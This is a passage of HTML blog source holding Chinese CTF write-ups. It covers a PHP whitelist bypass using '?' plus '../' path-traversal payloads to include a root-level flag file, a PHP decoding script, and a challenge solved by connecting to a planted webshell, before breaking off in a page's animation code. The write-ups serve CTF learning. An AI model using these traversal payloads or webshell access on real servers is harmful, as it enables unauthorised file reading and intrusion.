invoke__">mb_substr</span>(<span class="hljs-variable">$page</span>,<span class="hljs-number">0</span>,<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>))<br></code></pre></td></tr></table></figure><p>也就是把你传的哪个文件名里问号前面的部分截取出来（如果没有问号就全取）。但是一般来说正常文件名也没有问号呀2333，所以这道题还是挺刻意的。</p><p>它会去验证问好前面的部分是不是<code>source.php</code>或者<code>hint.php</code>，只有这两个文件是白名单。</p><p>那么很显然payload就是这样的。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">file</span>=hint.php?../ffffllllaaaagggg<br></code></pre></td></tr></table></figure><p>但是非常可惜，没有输出。</p><p>被迫看wp，原来这个flag文件在根目录下，hint倒是说清楚呀2333。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=hint.php?..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210926163418564.png" alt="ctf" /></p><p>同时这道题还可以二次url加密，形成一个payload，没啥意思。也能得到flag。</p><p><img src="https://upyun.wuuconix.link/image-20210926163503474.png" alt="二次url加密" /></p><p>这道题让我比较感兴趣的一点在于目录遍历的时候，文件名后加个<code>?</code>竟然能够毫无阻碍得继续向上级目录进发，仿佛没有这个问号似的。</p><p>在linux里是无法实现类似操作的。</p><p><img src="https://upyun.wuuconix.link/image-20210926163715763.png" alt="cd tools?/../" /></p><p>我用本地环境试了一下，发现还蛮有道理的。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=poc.py..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210926164353616.png" alt="正常1" /></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=poc.py?..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210926164441093.png" alt="正常2" /></p><p>这是为什么呢？看完下一个payload你就懂了。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=poc.py?sdjfljdflsldfjasklfjweiohfuuwejvsdv6513544..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210926164602990.png" alt="正常2" /></p><p><a href="http://xn--poc-lp6eu21c.py?%E5%90%8E%E9%9D%A2%E5%8F%88%E4%B9%B1%E6%89%93%E4%BA%86%E4%B8%80%E5%A0%86%E4%B8%9C%E8%A5%BF%E4%BB%8D%E7%84%B6%E8%83%BD%E5%A4%9F%E6%AD%A3%E5%B8%B8%E5%BE%97%E5%88%B0flag%E3%80%82">我在poc.py?后面又乱打了一堆东西仍然能够正常得到flag。</a></p><p>实际上在php眼里这几个paylaod都是一样的，因为它们都是通过当前目录下的某个文件，一开始是<code>poc.py</code>,然后是<code>poc.py?</code>，最后是<code>poc.py?sdjfljdflsldfjasklfjweiohfuuwejvsdv6513544</code>，来进入上级目录，我们这种目录遍历的形式实际上把哪个文件看成了文件夹。</p><p>所以这时哪个文件具体的内容，甚至说存不存在这个文件都已经没有关系了，因为我们只是把它当跳板，显然php也是这么想的。</p><p>所以我们在这道题里输的<code>source.php?</code>，php会把它看成一个文件夹，虽然它不存在，而我们以这个虚空的文件夹为基础跳板，得到了根目录下的flag。</p><h2 id="web2"><a class="markdownIt-Anchor" href="#web2"></a> web2</h2><p>看似是一道web题，实际上是一道密码题2333。对应写出逆就行了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$miwen</span>=<span class="hljs-string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$_o</span>=<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$str</span>);<br>    <span class="hljs-comment">// echo $_o;</span><br>        <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$_0</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$_0</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_o</span>);<span class="hljs-variable">$_0</span>++)&#123;<br>       <br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_o</span>,<span class="hljs-variable">$_0</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$__</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$_c</span>)+<span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$__</span>);<br>        <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_c</span>;   <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_</span>)));<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   逆向加密算法，解密$miwen就是flag</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$miwen</span>=<span class="hljs-string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;<br>        <span class="hljs-variable">$_</span> = <span class="hljs-title function_ invoke__">base64_decode</span>((<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$miwen</span>))));<br>        <span class="hljs-variable">$_o</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_</span>); <span class="hljs-variable">$i</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>--) &#123;<br>                <span class="hljs-variable">$_c</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_</span>, <span class="hljs-variable">$i</span>, <span class="hljs-number">1</span>);<br>                <span class="hljs-variable">$_o</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$_c</span>) - <span class="hljs-number">1</span>) . <span class="hljs-variable">$_o</span>;<br>        &#125;<br>        <span class="hljs-variable">$_o</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$_o</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_o</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20211031223227219.png" alt="flag" /></p><p>这里发现了一个有趣的函数，str_rot13，实际上就是移位密码，每个字母往后移13位。因为字母个数是26位，所以再移一次就移回来了，故其逆函数就是本身。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lilac纳新赛web部分题目wp</title>
    <link href="/2021/09/12/lilac/"/>
    <url>/2021/09/12/lilac/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-ivyiCvwl" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1859174383" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="跑马场"><a class="markdownIt-Anchor" href="#跑马场"></a> 跑马场</h2><p>该题界面贼炫酷。各种光点聚合起来形成文字。再分开重新组成下一个句子。</p><p><img src="https://upyun.wuuconix.link/image-20210906212423461.png" alt="界面" /></p><p>有用的信息就是有一个马<code>ma.php</code>。访问后得到密码。</p><p><img src="https://upyun.wuuconix.link/image-20210906212628900.png" alt="马的密码" /></p><p>蚁剑连接即可。</p><p><img src="https://upyun.wuuconix.link/image-20210906212757623.png" alt="flag.txt" /></p><p>本题源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">body</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">            <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">            <span class="hljs-attribute">overflow</span>: hidden;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-id">#cas</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">            <span class="hljs-attribute">margin</span>: auto;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>跑马场<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;cas&#x27;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;800&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:#262929&quot;</span>&gt;</span>您那破烂浏览器不支持 Canvas，换个现代浏览器吧。<span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ele&quot;</span>&gt;</span>好消息，好消息<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ele&quot;</span>&gt;</span>贵站已被日，勿念<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ele&quot;</span>&gt;</span>俺是大嘿客<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ele&quot;</span>&gt;</span>俺还留了个马<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ele&quot;</span>&gt;</span>ma.php<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ele&quot;</span>&gt;</span>马照跑，舞照跳<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    (<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> dr;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> canvas = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;cas&quot;</span>),</span><br><span class="language-javascript">            ele = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&quot;.ele&quot;</span>),</span><br><span class="language-javascript">            context = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&#x27;2d&#x27;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> focallength = <span class="hljs-number">250</span>,index = <span class="hljs-number">0</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> pause = <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> dots = [];</span><br><span class="language-javascript"></span><br><span class="language-javascript">        canvas.<span class="hljs-property">width</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>;</span><br><span class="language-javascript">        canvas.<span class="hljs-property">height</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">RAF</span> = (<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">requestAnimationFrame</span> || <span class="hljs-variable language_">window</span>.<span class="hljs-property">webkitRequestAnimationFrame</span> || <span class="hljs-variable language_">window</span>.<span class="hljs-property">mozRequestAnimationFrame</span> || <span class="hljs-variable language_">window</span>.<span class="hljs-property">oRequestAnimationFrame</span> || <span class="hljs-variable language_">window</span>.<span class="hljs-property">msRequestAnimationFrame</span> || <span class="hljs-keyword">function</span>(<span class="hljs-params">callback</span>) &#123;</span><br><span class="language-javascript">                        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">window</span>.<span class="hljs-built_in">setTimeout</span>(callback, <span class="hljs-number">1000</span> / <span class="hljs-number">60</span>);</span><br><span class="language-javascript">                    &#125;;</span><br><span class="language-javascript">        &#125;)();</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> <span class="hljs-title class_">Dot</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">centerX, centerY, centerZ, radius, color</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">dx</span> = centerX;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">dy</span> = centerY;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">dz</span> = centerZ;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">tx</span> = <span class="hljs-number">0</span>;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">ty</span> = <span class="hljs-number">0</span>;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">tz</span> = <span class="hljs-number">0</span>;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">z</span> = centerZ;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> = centerX;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> = centerY;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">radius</span> = radius;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;</span><br><span class="language-javascript">        &#125;;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title class_">Dot</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">paint</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                context.<span class="hljs-title function_">save</span>();</span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> scale = (<span class="hljs-variable language_">this</span>.<span class="hljs-property">z</span> + focallength) / (<span class="hljs-number">2</span> * focallength);</span><br><span class="language-javascript">                context.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">&quot;rgba(&quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span>.<span class="hljs-property">a</span> + <span class="hljs-string">&quot;,&quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span>.<span class="hljs-property">b</span> + <span class="hljs-string">&quot;,&quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span>.<span class="hljs-property">c</span> + <span class="hljs-string">&quot;,&quot;</span> + scale + <span class="hljs-string">&quot;)&quot;</span>;</span><br><span class="language-javascript">                context.<span class="hljs-title function_">fillRect</span>(canvas.<span class="hljs-property">width</span> / <span class="hljs-number">2</span> + (<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> - canvas.<span class="hljs-property">width</span> / <span class="hljs-number">2</span>) * scale, canvas.<span class="hljs-property">height</span> / <span class="hljs-number">2</span> + (<span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> - canvas.<span class="hljs-property">height</span> / <span class="hljs-number">2</span>) * scale, <span class="hljs-variable language_">this</span>.<span class="hljs-property">radius</span> * scale*<span class="hljs-number">2</span> , <span class="hljs-variable language_">this</span>.<span class="hljs-property">radius</span> * scale*<span class="hljs-number">2</span>)</span><br><span class="language-javascript">                context.<span class="hljs-title function_">restore</span>();</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">forEach</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">callback</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>; i++) &#123;</span><br><span class="language-javascript">                callback.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>[i]);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title function_">eachEle</span>();</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">function</span> <span class="hljs-title function_">eachEle</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            dr = <span class="hljs-number">3</span>;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> (ele[index].<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&#x27;data-dr&#x27;</span>) !== <span class="hljs-literal">null</span>) &#123;</span><br><span class="language-javascript">                dr = <span class="hljs-built_in">parseInt</span>(ele[index].<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&#x27;data-dr&#x27;</span>))</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            context.<span class="hljs-title function_">clearRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, canvas.<span class="hljs-property">width</span>, canvas.<span class="hljs-property">height</span>);</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> (ele[index].<span class="hljs-property">innerHTML</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;img&quot;</span>) &gt;= <span class="hljs-number">0</span>) &#123;</span><br><span class="language-javascript">                img.<span class="hljs-property">src</span> = ele[index].<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;img&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">src</span>;</span><br><span class="language-javascript">                <span class="hljs-title function_">imgload</span>(img, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    context.<span class="hljs-title function_">drawImage</span>(img, canvas.<span class="hljs-property">width</span> / <span class="hljs-number">2</span> - img.<span class="hljs-property">width</span> / <span class="hljs-number">2</span>, canvas.<span class="hljs-property">height</span> / <span class="hljs-number">2</span> - img.<span class="hljs-property">height</span> / <span class="hljs-number">2</span>);</span><br><span class="language-javascript">                    dots = <span class="hljs-title function_">getimgData</span>();</span><br><span class="language-javascript">                    <span class="hljs-title function_">initAnimate</span>();</span><br><span class="language-javascript">                &#125;)</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> text = ele[index].<span class="hljs-property">innerHTML</span>;</span><br><span class="language-javascript">                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; text.<span class="hljs-property">length</span>; i++) &#123;</span><br><span class="language-javascript">                    context.<span class="hljs-title function_">save</span>();</span><br><span class="language-javascript">                    <span class="hljs-keyword">var</span> fontSize = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100</span> + <span class="hljs-number">100</span>;</span><br><span class="language-javascript">                    context.<span class="hljs-property">font</span> = fontSize + <span class="hljs-string">&quot;px bold&quot;</span>;</span><br><span class="language-javascript">                    context.<span class="hljs-property">textAlign</span> = <span class="hljs-string">&quot;center&quot;</span>;</span><br><span class="language-javascript">                    context.<span class="hljs-property">textBaseline</span> = <span class="hljs-string">&quot;middle&quot;</span>;</span><br><span class="language-javascript">                    <span class="hljs-keyword">var</span> code = text.<span class="hljs-title function_">charAt</span>(i);</span><br><span class="language-javascript">                    context.<span class="hljs-property">fillStyle</span> = <span 